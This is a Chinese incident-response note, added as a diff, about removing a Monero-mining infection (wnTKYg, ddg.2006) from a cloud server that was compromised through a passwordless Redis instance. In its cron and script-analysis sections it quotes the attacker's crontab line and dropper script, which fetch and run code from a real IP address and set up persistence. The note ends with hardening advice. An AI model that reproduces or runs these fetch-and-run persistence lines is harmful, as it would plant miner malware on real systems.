@@ -1,0 +1,134 @@
+🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸 wnTKYg 进程🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸
+👹  服务器cpu 99%   2017-08-6-20 GCE .
+
+🔸 top 查看服务器状态
+    PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND
+    12011 root      20   0  236236   3268    912 S 95.1  0.2  12:00.00 wnTKYg
+
+    先不要 kill 病毒进程!先利用ps 找出病毒执行路径! 如果你kill了, ps 就找不到路径了.
+
+
+🔸 ps -ef 查看进程源文件路径
+    ✘✘∙GCE ~ ➜ ps -ef | grep wnTKYg
+    root     12090     1 99 20:22 ?        00:00:46 /tmp/wnTKYg
+
+
+🔸 关闭进程， 找到源文件；删除
+    kill 12090 
+    rm /tmp/wnTKYg
+    👁‍🗨 病毒一般都会在一段时间内重启的!!! kill 无效的. 得进一步操作.
+
+◼︎▶✭
+🔸 查看进程文件
+    ✘✘∙GCE /tmp ➜ ls /tmp/wnTKYg
+    -rwxr-xr-x 1 root root 1361472 Jul 31 01:16 /tmp/wnTKYg
+
+
+🔸 查看病毒主程序
+    其实 wnTKYg 是个子程序. 是自动生成的! 就算你删除了.还是会自动生成的
+
+其实还有个病毒程序. 这个用的cpu不多.你很难发现.
+ 4020 root      20   0  200456   7904   3040 R  0.3  0.5   0:52.34 ddg.2006
+
+
+✘✘∙GCE /tmp ➜ ps -ef | grep ddg.2006
+root      4020     1  0 00:37 ?        00:00:52 /tmp/ddg.2006
+
+还是在 /tmp 文件夹里面的. 肯定也不是主程序!
+
+
+
+🔸 清除定时任务：在 /var/spool/cron 下的文件直接删除
+
+    ✘✘∙GCE cron ➜ ls -a /var/spool/cron
+    total 4
+    drwx------. 3 root root 32 Jul 31 01:13 .
+    drwxr-xr-x. 8 root root 81 Nov  5  2016 ..
+    drwxr-xr-x  2 root root 17 Jul 31 01:13 crontabs
+    -rw-r--r--  1 root root 62 Aug  6 20:45 root
+
+
+🔸 取消 crontabs 执行权限
+    chmod -x /var/spool/cron/crontabs
+    注意这是个文件夹. 不是文件. 里面有个root 文件.
+
+🔸 查看定时脚本
+    cat /var/spool/cron/crontabs/root
+    */5 * * * * curl -fsSL http://218.248.40.228:9999/i.sh?6 | sh
+
+    ⦿  脚本作用 curl 是下载.
+    ⦿  http://218.248.40.228:9999/i.sh  真正病毒脚本.
+    ⦿ | sh  应该是直接用sh命令运行的意思!
+
+
+🔸 删除定时脚本文件
+    rm -R /var/spool/cron/
+    然后可以研究病毒了. 应该不会再自动运行了.
+    这里再top看看. 
+    确保/tmp下面 没有病毒文件了.
+
+
+🔸 查看脚本真正内容 & 解析
+    脚本下到本地. 打开查看.
+
+    export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin
+
+    echo "*/5 * * * * curl -fsSL http://218.248.40.228:9999/i.sh?6 | sh" > /var/spool/cron/root
+        ➜ 创建root文件并写入内容.
+    mkdir -p /var/spool/cron/crontabs
+        ➜ 创建/var/spool/cron/crontabs 文件夹
+    echo "*/5 * * * * curl -fsSL http://218.248.40.228:9999/i.sh?6 | sh" > /var/spool/cron/crontabs/root
+        ➜ 文件夹里再创建root文件并写入内容. 为了保险吧!
+    if [ ! -f "/tmp/ddg.2006" ]; then
+        curl -fsSL http://218.248.40.228:9999/2006/ddg.$(uname -m) -o /tmp/ddg.2006
+    fi
+        ➜ 如果 /tmp文件夹下 ddg.2006 脚本文件不存在.那么直接从服务器下载.
+    #chmod +x /tmp/ddg.2006 && /tmp/ddg.2006
+
+    #killall ddg.2001
+    #killall ddg.2002
+    killall ddg.2003
+    killall ddg.2004
+    killall ddg.2005
+
+
+🔸 步骤总结
+    1. 我们必须删除 /var/spool/cron/ 文件夹下所有文件
+    2. rm /tmp/wnTKYg
+    3. rm /tmp/ddg.2006
+    4. top 监控一段时间. cpu 不再100%
+
+    禁止文件的可执行权限，检查 crontab ，然后 kill 进程，最后删除文件基本上就可以了。 
+    当然还得检查入侵点做好防护。
+
+
+
+
+
+
+🔸 谷歌进程
+    谷歌 wnTKYg ➜ 被黑了.. 被挖矿了... fuck 难怪被gce停机了...
+
+
+🔸 事故原因
+    网上搜索后得知是 redis 的一个漏洞，主要利用 redis 安装后没有设置密码和限制登录来源，使用
+    redis-cli -h IP 就可以直接远程登录 redis
+
+    这样的病毒是直接远程连接Redis，一般redis都是root安装的，连接redis也就掌握了root权限，它可以往你的定时任务里写内容。
+
+    中这样的病毒大多都是因为redis没有设置密码，存在着很大的安全漏洞，所以大家要设置redis密码，并且更改redis的端口。安装时最好别用root安装。（后续会更新redis设置密码，和连接java）
+    查了些资料看有人说这是在挖币，wnTKYg是门罗币，所以大家要注意服务器的安全，别让自己的资源让别人用来挣钱。
+
+
+
+🔸 解决方法
+    1. 设置 redis 密码
+    2. 限制远程登录的来源 IP
+    3. 不使用 root 用户运行 redis
+
+    就算你的 radis 只是临时用用的也不行! 
+    人家专业扫描的. 只要你一开redis .而且没密码..人家立马黑你啊..
+
+
+
+
